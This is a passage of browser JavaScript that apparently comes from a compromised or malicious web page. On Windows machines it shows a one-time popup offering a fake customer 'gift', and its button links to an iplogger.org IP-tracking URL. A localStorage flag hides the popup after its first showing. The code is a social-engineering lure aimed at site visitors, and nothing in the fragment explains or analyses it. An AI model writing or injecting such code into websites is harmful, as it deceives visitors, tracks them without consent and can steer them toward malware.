   ...
   if (navigator.platform == "Win32" && localStorage.getItem("zsfqwf") != 1) {
    $('body').append("<div id=showw></show>");
   $("#showw").html('<div class="modal fade" id="ouibounce-modal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true"><div class="modal-dialog"> <div class="modal-content"><div class="modal-body" style="background:#000000 url(&quot;https://ci5.googleusercontent.com/proxy/qqP1EQ3xOOLgVip2vE0i_hEgzn0SpHxmwtng4MDPsbc3eae6MxVZtFQo1rCZWIBXzpn32hilLF6M9INIMP5yaTfFPtUBSmU2oeDAZ2zmR5TuMqz0_CsRZTS2CYJyQAwedXakfEwYGJPjWQHEO4d0igwHvZLMGDjsgZs=s0-d-e1-ft#https://gallery.mailchimp.com/5b92f7082b87f7137a9ce32a8/images/71d572b1-2371-4ee5-93c0-a4987ac07b00.png&quot;) no-repeat center/cover;background-color:#000000;background-image:url(https://ci5.googleusercontent.com/proxy/qqP1EQ3xOOLgVip2vE0i_hEgzn0SpHxmwtng4MDPsbc3eae6MxVZtFQo1rCZWIBXzpn32hilLF6M9INIMP5yaTfFPtUBSmU2oeDAZ2zmR5TuMqz0_CsRZTS2CYJyQAwedXakfEwYGJPjWQHEO4d0igwHvZLMGDjsgZs=s0-d-e1-ft#https://gallery.mailchimp.com/5b92f7082b87f7137a9ce32a8/images/71d572b1-2371-4ee5-93c0-a4987ac07b00.png);background-repeat:no-repeat;background-position:center;background-size:cover;border-top:0;border-bottom:0;padding-top:200px;padding-bottom:200px"><h2 style="padding:0px 18px 9px;color:#ffffff;font-family:Lato,"Helvetica Neue",Helvetica,Arial,sans-serif;font-size:60px;line-height:100%;text-align:center;word-break:break-word">Thanks for being our customer, here is an gift for you! Enjoy</h2><br> <center><a href="https://iplogger.org/2vjMm5"><img src="https://i.ibb.co/pnDRkQw/button.png"></a></center> </div><div class="modal-footer"> <button type="button" class="btn btn-primary" data-dismiss="modal">No thanks</button></div> </div> </div> </div>');

    localStorage.setItem("zsfqwf", "1");
    (function() {
   ...
   } else if (localStorage.getItem("zsfqwf") === 1) {
    $("#showw").remove();
   } else {
